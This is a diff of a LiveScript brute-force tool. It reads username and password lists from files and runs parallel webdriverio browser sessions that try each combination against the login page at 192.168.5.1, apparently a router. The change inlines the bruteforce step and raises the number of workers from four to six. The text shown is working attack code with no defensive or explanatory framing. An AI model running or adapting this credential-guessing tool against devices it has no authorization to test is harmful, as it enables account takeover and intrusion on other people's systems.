@@ -95,25 +95,17 @@ class BruteForcer
     p.all([ @getUser!, @getPass! ]).then ->
       resolve user: it[0], pass: it[1]
 
-bruteForcer = new BruteForcer('user.txt', 'pass.txt')
 
-loopy = ->
-  bruteForcer.next!then -> console.log it; loopy!
-loopy!
 
-bf = (page) ->
-  page
-  .timeoutsImplicitWait(500)
-  .bruteforce bruteForcer
-  .then (-> console.log "PASS", it), ((err) -> console.log "FAIL", err)
-
+bruteForcer = new BruteForcer 'user.txt', 'pass.txt'
  
-# http://www.webdriver.io/api/
 workerN = 0
 
 spawnWorker = ->
   n = workerN++
   page = webdriverio.remote(options).init!
+  
+  # check http://www.webdriver.io/api/ for api
 
   page.addCommand "bruteforce", (bruteForcer) ->
     loopy = ~> 
@@ -132,7 +124,7 @@ spawnWorker = ->
   .timeoutsImplicitWait(200)
   .url('http://192.168.5.1')
   .title (err, res) -> console.log('title: ' + res.value)
+  .bruteforce bruteForcer
+  .then (-> console.log "PASS", it), ((err) -> console.log "FAIL", err)
 
-  bf page
-
-_.times 4, spawnWorker    
+_.times 6, spawnWorker
